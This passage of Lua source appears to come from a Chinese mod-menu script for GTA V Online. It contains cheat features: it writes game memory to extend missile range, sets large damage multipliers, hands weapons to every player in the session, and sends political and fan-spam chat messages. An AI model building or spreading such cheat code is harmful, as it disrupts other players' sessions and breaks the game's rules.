                directx.draw_rect(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1), overlay_y + (i > 4 and (boxMargin + size * ratio) or 0)* 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
            end
        end
        if altShiftCtrl then
            if wasd[#wasd - 2].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 2].pressed and pressed_background_colour or background_colour)
            end
            if wasd[#wasd - 1].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2.5,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 1].pressed and pressed_background_colour or background_colour)
            end
        else
            for i = 9, 10 do
                if wasd[i].show then
                directx.draw_rect(overlay_x - (boxMargin + size), overlay_y + (boxMargin + size * ratio) * (i - 8) * 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x - (boxMargin + size)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio) * (i - 8)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
                end
            end
        end
        if wasd[#wasd].show then
            directx.draw_rect(overlay_x + (boxMargin + size) * altSpaceBar, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) * spaceBarLength - boxMargin, size * ratio / spaceBarSlim, wasd[#wasd].pressed and pressed_background_colour or background_colour)
        end
	end
end)
menu.trigger_commands("anjian off")
menu.action(online, '雪球大战', {}, '给战局中的每个人雪球并通过文字通知它们', function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
         notification("你获得了雪球！", colors.black)
        util.yield()
    end
end)
menu.action(online, '玩家暴乱', {}, '给战局中的每个人提供烟花发射器并通过文字通知它们', function ()
    local plist = players.list()
    local fireworks = util.joaat('weapon_firework')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, fireworks, 20, true)
        WEAPON.SET_PED_AMMO(plyr, fireworks, 20)
        players.send_sms(plist[i], players.user(), '暴乱时刻到!你获得了烟花')
        util.yield()
    end
end)
menu.toggle_loop(online, '富得掉钱', {}, '走过路过都是钱~', function ()
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local tar1 = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
    Streamptfx('scr_exec_ambient_fm')
    if TASK.IS_PED_WALKING(targets) or TASK.IS_PED_RUNNING(targets) or TASK.IS_PED_SPRINTING(targets) then
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('scr_ped_foot_banknotes', tar1.x, tar1.y, tar1.z - 1, 0, 9, 0, 1.0, true, true, true)
    end    
end)
menu.action(online, '停止观看', {'sspect'}, '停止在战局里观看任何人', function ()
    Specon(players.user())
    Specoff(players.user())
end)
menu.toggle_loop(online, '增加虎鲸导向导弹射程', {'krange'}, '你可在地图的任何地方使用', function ()
    if util.is_session_started() then
    memory.write_float(memory.script_global(262145 + 30176), 200000.0)
    end
end)
local onlinechats = menu.list(online, "快捷聊天", {}, "八嘎！~")
menu.action(onlinechats, "价值观", {}, "", function()
   chat.send_message("富强、民主、文明、和谐，自由、平等、公正、法治，爱国、敬业、诚信、友善。", false, true, true)
end)
menu.action(onlinechats, "中国台湾", {}, "", function()
   chat.send_message("世界上只有一个中国，坚持一个中国原则，台湾是中国领土不可分割的一部分！", false, true, true)
   chat.send_message("There is only one China in the world, the one-China principle is upheld, and Taiwan is an inalienable part of China's territory!", false, true, true)
end)
menu.action(onlinechats, "夜幕Lua", {}, "", function()
   chat.send_message("我爱夜幕，夜幕牛逼，夜幕666！", false, true, true)
 end)
local cxkchats = menu.list(onlinechats, "IKUN语录", {}, "八嘎！~")
 menu.action(cxkchats, "ikun1", {}, "ikun语录", function()
   chat.send_message(" 我们家坤坤不容易，为什么还去伤害，如果黑粉再触发到我们的底线，后果自负！坤坤你继续红下去，我们永远支持你的！", false, true, true)
   chat.send_message(" 他拿奖杯拿到手软。即使你把键盘敲烂了他还是能拿到奖。巨C不懂糊的悲。你拿什么和你坤哥斗。”世间再无如此完美的一个人。", false, true, true)
   chat.send_message(" 我希望你真的是ikun，而不是在这里伪装碟中谍，爱蔡徐坤不是爱在短视频发他视频,这样也可能会招黑，爱他爱在心动的那首歌，爱在为之动容的颜值，爱在每一个爱的瞬间，真爱粉永远都在", false, true, true)
   store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound1.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
   
menu.action(cxkchats, "我是小黑子", {}, "此功能有音乐，请提前调好音量！", function()
   chat.send_message("鸡你太美！", false, true, true)
   chat.send_message(" 你干嘛～～哎呦", false, true, true)
   chat.send_message(" 等到坤坤老了，变得难看了，你们或许就不喜欢他了，而我们到时候见了他仍会叫一声“鸡哥”巅峰迎来虚伪的拥护，黄昏见证真正的信徒，谁是真正的ikun一目了然", false, true, true)
   store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound1.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(cxkchats, "ikun2", {}, "此功能有音乐，请提前调好音量！", function()
 chat.send_message(" 向阳花木易为春，听说你爱蔡徐坤。\n千军万马是ikun，ikun永远爱坤坤。\n待我ikun更强大，定帮坤哥赢天下。\n两耳不闻窗外事，一心只为蔡徐坤。\n追梦少年不失眠，未来可期蔡徐坤。\n向阳花木每逢春，ikun一直爱坤坤。", false, true, true)
   store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound8.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(cxkchats, "ikun3", {}, "此功能有音乐，请提前调好音量！", function()
 chat.send_message(" 在做的要么Ikun要么小黑子，今天我送大家一首cxk语录，劝你耗子尾汁好好反省：故人西辞黄鹤楼 ，唱跳Rap打篮球 。春风又绿江南岸 ，练习长达两年半。 清明时节雨坤坤，路上行人梳中分 ，借问背带何处有，牧童遥指我ikun。长江后浪推前浪，爱坤啥样我啥样。鸡冠头背带裤，我是ikun你记住。向阳花木易为春，听说你爱cxk。小黑子树枝666，蒸虾头，好丸吗？树枝赶人，蒸五鱼，食不食油饼，我家鸽鸽在胎上拿姜拿到手软，他那么努力，这样叫我怎么荔枝？已经橘爆你了，再这样我就抱紧了，劝你苏珊，不然我们ikun就紫砂了。", false, true, true)
   store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound9.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
entity_options  = menu.list(online,"世界选项", {},"管理世界")
entity_options1 = menu.action(entity_options, "加载世界选项", {""}, "", function()
        notification("正在加载世界选项,请稍等...",colors.black)
        util.yield(2000)
        require "lib.yymmlib.YMres"
        menu.delete(entity_options1)
    end)
menu.toggle(online, "提高FPS V1", {"fpsboost"}, "", function(on_toggle)
	if on_toggle then
		notification("正在优化FPS...")
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
        menu.trigger_commands("noidlecam ")
	else
		notification("正在重置FPS...")
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
        menu.trigger_commands("noidlecam ")
		end
end)
police  = menu.list(online,"警察选项", {},"化身为一名警察")
police_player1 = menu.action(police, "加载模拟警察选项", {""}, "", function()
        notification("正在加载模拟警察选项,请稍等...",colors.blue)
        util.yield(2000)
        require "lib.yymmlib.YMpolice"
        menu.delete(police_player1)
    end)
sihuachuansong = menu.list(online, "丝滑传送", {}, "德芙，纵享新丝滑:)", function(); end)
menu.action(sihuachuansong, "丝滑传送", {"stp"}, "在镜头平稳的情况下将您传送到您的航点,建议设置为一个hotkey", function ()
    SmoothTeleportToCord(Get_Waypoint_Pos2(), FRAME_STP)
end)
menu.toggle(sihuachuansong, "丝滑传送2.0", {"stpv2"}, "使您或您的车辆与镜头一起传送，来实现更丝滑的传送。", function(toggle)
    FRAME_STP = toggle
end)
menu.action(sihuachuansong, "重置镜头", {"resetstp"}, "将脚本 cam 渲染为 false，同时删除当前 cam。 因为如果你传送到海里，镜头鸡鸡了。", function ()
    local renderingCam = CAM.GET_RENDERING_CAM()
    CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
    CAM.DESTROY_CAM(renderingCam, true)
end)
local stpsettings = menu.list(sihuachuansong, "丝滑传送设置", {}, "")
menu.slider(stpsettings, "速度修改器（x）/10", {"stpspeed"}, "用于丝滑传送的速度修改器，乘法。 这将除以 10，因为滑块不能采用非整数", 1, 100, 10, 1, function(value)
    local multiply = value / 10
    if SE_Notifications then
        util.toast("丝滑速度倍增器设置为 " .. tostring(multiply) .. "!")
    end
    STP_SPEED_MODIFIER = 0.02 --set it again so it doesnt multiply over and over. This took too long to figure out....
    STP_SPEED_MODIFIER = STP_SPEED_MODIFIER * multiply
end)
menu.slider(stpsettings, "CAM过渡的高度（米）", {"stpheight"}, "在进行过渡时设置镜头的高度。", 0, 10000, 300, 10, function (value)
    local height = value
    if SE_Notifications then
        util.toast("丝滑传送高度设置为 " .. tostring(height) .. "!")
    end
    STP_COORD_HEIGHT = height
end)
menu.divider(sihuachuansong, "显示选项")
menu.toggle_loop(sihuachuansong, "显示当前位置", {"drawpos"},  "", function ()
    local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.0, 0.0, "x: " .. pos.x .. " // y: " .. pos.y .. " // z: " .. pos.z, ALIGN_TOP_LEFT, DR_TXT_SCALE, cc, false)
end)
menu.toggle_loop(sihuachuansong, "显示X/Y轴", {"drawrot"}, "", function ()
    local rot = ENTITY.GET_ENTITY_ROTATION(GetLocalPed(), 2)
    local cc = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
    directx.draw_text(0.5, 0.03, "pitch: " .. rot.x .. " // roll: " .. rot.y .. " // yaw: " .. rot.z, ALIGN_CENTRE, DR_TXT_SCALE, cc, false)
    local facingtowards
    if ((rot.z >= 135) or (rot.z < -135)) then facingtowards = "-Y"
    elseif ((rot.z < 135) and (rot.z >= 45)) then facingtowards = "-X"
    elseif ((rot.z >= -135) and (rot.z < -45)) then facingtowards = "+X"
    elseif ((rot.z >= -45) or (rot.z < 45)) then facingtowards = "+Y" end
    directx.draw_text(0.5, 0.07, "Facing towards " .. facingtowards, ALIGN_CENTRE, DR_TXT_SCALE, cc, false)
end)
menu.divider(sihuachuansong, "设置")
menu.slider(sihuachuansong, "文本大小（/10）", {"drscale"}, "将文本的比例设置为您指定的值，除以 10。这是因为它只采用整数值", 1, 50, 5, 1, function (value)
    DR_TXT_SCALE = value / 10
end)
yinyue = menu.list(misc,"音乐选项", {},"玩累了，听个歌？~")
menu.action(yinyue, '听我家坤坤的咯', {'music'}, '哎呦~你干嘛~', function(on) 
util.toast("开始IKUN时刻~ " )
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound7.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(yinyue, '自定义1', {'music'}, '', function(on) 
util.toast("开始播放自定义1 " )
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound15.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(yinyue, '自定义2', {'music'}, '', function(on) 
util.toast("开始播放自定义2 " )
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound16.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(yinyue, '自定义3', {'music'}, '', function(on) 
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound17.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(yinyue, '自定义4', {'music'}, '', function(on) 
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound18.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
menu.action(yinyue, '自定义5', {'music'}, '', function(on) 
store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound19.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
end)
jiazaixianshi = menu.list(misc,"加载显示选项", {},"此选项内包含加载夜幕显示选项")
menu.toggle(jiazaixianshi, "显示时间", {"timeos"}, "", function(state)
    xianshishijian(state)
end)
menu.trigger_commands("timeos on")
menu.toggle(jiazaixianshi, "显示脚本名称", {"scriptname"}, "", function(state)
    xianshijiaoben1(state)
end)
menu.trigger_commands("scriptname on")
menu.toggle_loop(jiazaixianshi, "主机序列", {"hostqu"}, "", function(state)
    scripthost(state)
end)
menu.trigger_commands("hostqu on")
menu.toggle_loop(jiazaixianshi, "显示实体数量", {"drawentpool"}, "", function (state)
    shitixianshi(state)
end)
menu.trigger_commands("drawentpool on")
--显示stand版本
local window_x = 0.01
local window_y = 0.01
local text_margin = 0.005
local text_height = 0.018 
local window_width = 0.12
local window_height = 0.15
local menu_items = {
    "夜幕Lua",
    "尊贵的夜幕用户",
    "感谢各位对夜幕的赞助与支持",
    "进群获取最新版本",
    "夜幕官方QQ群：332017587",
    "还在犹豫什么，快点进群吧！！！"   
}
local selected_index = 0
local blur_rect_instance
local function colour(r, g, b, a)
    return { 
        r = r / 255,
        g = g / 255,
        b = b / 255,
        a = a / 255
    }
end
local function gui_background(x, y, width, height, blur_radius)
    local background = colour(10, 0, 10, 180)
    local border_color_left = colour(255, 0, 255, 255)
    local border_color_right = colour(0, 0, 0, 255)
    directx.blurrect_draw(
        blur_rect_instance, 
        x, y, width, height,
        blur_radius or 5
    )
    directx.draw_rect(
        x, y,
        width, height,
        background
    )
    directx.draw_line(
        x, y,
        x, y + height,
        border_color_left
    )
    directx.draw_line(
        x, y,
        x + width, y,
        border_color_left, border_color_right
    )
    directx.draw_line(
        x + width, y,
        x + width, y + height,
        border_color_right
    )
    directx.draw_line(
        x, y + height,
        x + width, y + height,
        border_color_left, border_color_right
    )
end
local function text(text, x, y, text_scale, highlighted)
    if highlighted then
        directx.draw_rect(
            x, y,
            window_width - (text_margin * 2), text_height,
            colour(20, 15, 15, 0)
        )
    end

    directx.draw_text(
        x, y, text, ALIGN_TOP_LEFT, text_scale,
        colour(255, 255, 255, 255)
    )
end
local insinsts = "FocusOut"
local function render_list(x, y, list, selected_index)
    local ty = 0
    local text_scale = 0.5

    for i,v in pairs(list) do
        local highlighed = i == selected_index - 1

        text(v, x, y + ty, text_scale, highlighed)
        ty = ty + text_height
    end
end

local function edition_string()
    local edition = menu.get_edition()
    if edition == 0 then
        return "免费蛋蛋"
    elseif edition == 1 then
        return "基础蛋蛋"
    elseif edition == 2 then
        return "理智蛋蛋"
    elseif edition == 3 then
        return "超级无敌大蛋蛋"
    end
end
local function render_menu()
    local width = window_width
    local height = window_height
    gui_background(window_x, window_y,
        width, height)
    text("STAND " .. edition_string(),
        window_x + text_margin,
        window_y + text_margin,
        0.6, false)  
    local top_margin = 0.025   
    render_list(
        window_x + text_margin,
        window_y + text_margin + top_margin,
        menu_items, selected_index
    )
end
local function set_menu_open(toggle) end 
local menu_is_open = false
local function input_handler()
    if menu.is_open() then return end
    local VK_NUMPAD8 = 0x68
    local VK_NUMPAD2 = 0x62
    if util.is_key_down(VK_NUMPAD2) then
        selected_index = selected_index + 1
    elseif util.is_key_down(VK_NUMPAD8) then
        selected_index = selected_index - 1
    end
end
local function tick_handler()
    if menu_is_open then
        render_menu()
    end
    input_handler()
    return true
end
blur_rect_instance = directx.blurrect_new()
util.create_tick_handler(tick_handler) 
function set_menu_open(toggle)
    if toggle and not menu_is_open then
        menu_is_open = true     
    elseif not toggle and menu_is_open then
        menu_is_open = false
    end
end
menu.toggle(misc, "Stand版本", {}, "", function(toggle)
    set_menu_open(toggle)
end)
menu.toggle_loop(misc, "全民制作人", {"gtzz"}, "", function()
    draw_string(string.format("~italic~~bold~~p~Ping~q~制~p~作"), 0.350,0.150, 2,5)
end)
menu.toggle_loop(misc, "荔枝皮（娱乐）", {"lizhipi"}, "", function()
        draw_string(string.format("~italic~~bold~荔枝皮骗作者1600原石，请看到的玩家帮助作者骂荔枝皮！"), 0.1,0.15, 0.8,5)
end)
menu.toggle_loop(misc, "新年祝福", {"xinnianzhufu"}, "", function()
        draw_string(string.format("~italic~~bold~~r~新年到了！"), 0.1,0.15, 0.8,5)
        draw_string(string.format("~italic~~bold~~g~夜幕作者在这祝你新年快乐！"), 0.3,0.3, 0.8,5)
        draw_string(string.format("~italic~~bold~~g~新的一年里要开开心心，吃好喝好！"), 0.6,0.45, 0.8,5)
end)
local kongzhitai = menu.list(misc, "控制台选项", {""}, "")
local log_dir = filesystem.stand_dir() .. '\\Log.txt'
local full_stdout = ""
local disp_stdout = ""
local max_chars = 200
local max_lines = 20
local font_size = 0.35
local timestamp_toggle = false
local function get_stand_stdout(tbl, n)
    local all_lines = {}
    local disp_lines = {}
    local size = #tbl
    local index = 1
    if size >= n then 
        index = #tbl - n
    end
    for i=index, size do 
        local line = tbl[i]
        local line_copy = line
        if line ~= "" and line ~= '\n' then
            all_lines[#all_lines + 1] = line
            if not timestamp_toggle then
               -- at this point, the line is already added to all lines, so we can just customize it and it wont affect STDOUT clipboard copy
                local _, second_segment = string.partition(line, ']')
                if second_segment ~= nil then
                    line = second_segment
                end
            end
            if string.len(line) > max_chars then
                disp_lines[#disp_lines + 1] = line:sub(1, max_chars) .. ' ...'
            else
                disp_lines[#disp_lines + 1] = line
            end
        end
    end
    -- full_stdout exists so that we can copy the entire console output without "aesthetic" changes or trimming
    -- disp_stdout is the aesthetic, possibly-formatted version that you actually see in-game, WITH trimming
    full_stdout = table.concat(all_lines, '\n')
    disp_stdout = table.concat(disp_lines, '\n')
end
local function get_last_lines(file)
    local f = io.open(file, "r")
    local len = f:seek("end")
    f:seek("set", len - max_lines*1000)
    local text = f:read("*a")
    lines = string.split(text, '\n')
    f:close()
    get_stand_stdout(lines, max_lines)
end


menu.slider(kongzhitai, "最大显示字数", {"nconsolemaxchars"}, "", 1, 1000, 200, 1, function(s)
    max_chars = s
end)
menu.slider(kongzhitai, "最大显示行数", {"nconsolemaxlines"}, "", 1, 60, 20, 1, function(s)
    max_lines = s
end)
menu.slider_float(kongzhitai, "字体大小", {"nconsolemaxlines"}, "", 1, 1000, 35, 1, function(s)
    font_size = s*0.01
end)
menu.toggle(kongzhitai, "显示时间", {"ndrawconsole"}, "", function(on)
    timestamp_toggle = on
end, false)
menu.toggle(kongzhitai, "绘制控制台", {"ndrawconsole12"}, "", function(on)
    draw_toggle = on
end)
local text_color = {r = 1, g = 1, b = 1, a = 1}
menu.colour(kongzhitai, "字体颜色", {"nconsoletextcolor"}, "", 1, 1, 1, 1, true, function(on_change)
    text_color = on_change
end)
local bg_color = {r = 0, g = 0, b = 0, a = 0.5}
menu.colour(kongzhitai, "背景颜色", {"nconsolebgcolor"}, "", 0, 0, 0, 0.5, true, function(on_change)
    bg_color = on_change
end)
util.create_tick_handler(function()
    local text = get_last_lines(log_dir)
    if draw_toggle then
        local size_x, size_y = directx.get_text_size(disp_stdout, font_size)
        size_x += 0.01
        size_y += 0.01
        directx.draw_rect(0.0, 0.05, size_x, size_y, bg_color)
        directx.draw_text(0.0, 0.05, disp_stdout, 0, font_size, text_color, true)
    end
end)
diyi = menu.list(sc, "第一模组选项")
diyimozu = menu.action(diyi, "加载第一模组选项", {""}, "", function()
notification("正在加载第一模型脚本,请稍等",colors.blue)
util.yield(2000)
    require "lib.yymmlib.Constructor"
    menu.delete(diyimozu)
end)
model_options = menu.list(sc, "第二模组选项")
lancesp = menu.action(model_options, "加载第二模组选项", {""}, "", function()
notification("正在加载第二模型脚本,请稍等",colors.blue)
util.yield(2000)
    require "lib.yymmlib.spooner"
    menu.delete(lancesp)
end)
script_meta_menu = menu.list(menu.my_root(), "夜幕脚本支持", {}, "")
    acknowledgement()
    --end)
    
menu.toggle_loop(exterior, "发光", {}, "", function()
   FG()
end)     
menu.toggle_loop(funfeatures, "外星人入侵", {}, "", function(toggle)
    ufffo()
end)
burning_man_ptfx_effect = "fire_wrecked_plane_cockpit"
firebones  = {
        26612,	
        58868,	
}
firebones1  = {
        26612,	
        58868,	
}
local bigbarrelqq = false
menu.toggle(funfeatures, "闪电大锤", {"bighammer"}, "", function(on)
            if on then
            for _, boneId in ipairs(firebones) do
            request_ptfx_asset("scr_reconstructionaccident")
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_reconstructionaccident")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)            end
            for _, boneId in ipairs(firebones1) do
            request_ptfx_asset("scr_reconstructionaccident")
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_reconstructionaccident")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 2, false, false, false, 0, 0, 0, 0)            end
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 100, 100, 100, false)
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
                dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_02a"), pos.x, pos.y, pos.z, true, true, false)
                tongzi = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_02a"), pos.x, pos.y, pos.z, true, true, false)
                menu.trigger_commands("damagemultiplier 10000")
                menu.trigger_commands("rangemultiplier 9.5")
                ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(tongzi,dachui, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true)
                util.yield(1000)
                bigbarrelqq = on
            else
                menu.trigger_commands("damagemultiplier 1")
                menu.trigger_commands("rangemultiplier 1")
                entities.delete_by_handle(dachui)
                entities.delete_by_handle(tongzi)
                bigbarrelqq = off
                WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
            GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
            end
end,false)
firebones  = {
        26612,	
        58868,	
}
local bigbarrelqqV2 = false
    menu.toggle(funfeatures, "细狗的威力", {"ciliudog"}, "不要小瞧细狗的威力", function(on)
        notification("细狗---闪亮登场~",colors.black)
        MISC.FORCE_LIGHTNING_FLASH()
        if on then
            for _, boneId in ipairs(firebones) do
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("fire_wrecked_plane_cockpit", players.user_ped(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(players.user_ped(), boneId), 0.35, false, false, false, 0, 0, 0, 0)
            end
            WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
            dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_tool_screwvr03"), pos.x, pos.y, pos.z, true, true, false)--prop_gate_farm_post
            menu.trigger_commands("damagemultiplier 1000")
            menu.trigger_commands("rangemultiplier 1.5")
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true)
            util.yield(1000)
            bigbarrelqqV2 = on
        else
        menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("rangemultiplier 1")
        entities.delete_by_handle(dachui)
        bigbarrelqqV2 = off
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),-1810795771)
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
    end
end,false)
heidong = menu.list(funfeatures,"黑洞选项", {},"加载之后玩家栏有副菜单！")
heidongxuanxiang = menu.action(heidong, "加载黑洞选项", {""}, "", function()
        notification("正在加载黑洞选项,请稍等...",colors.blue)
        util.yield(2000)
        require "lib.yymmlib.YMh"
        menu.delete(heidongxuanxiang)
    end)
menu.toggle(funfeatures, "洛圣都暴乱", {}, "因为npc受不了巨大的压力而引发暴乱！", function(toggle)
    MISC.SET_RIOT_MODE_ENABLED(toggle)
end)
menu.toggle_loop(funfeatures, "载具暴乱", {}, "使附近的汽车进入哥布林-妖精模式",function()
    for i, veh in ipairs(entities.get_all_vehicles_as_handles()) do
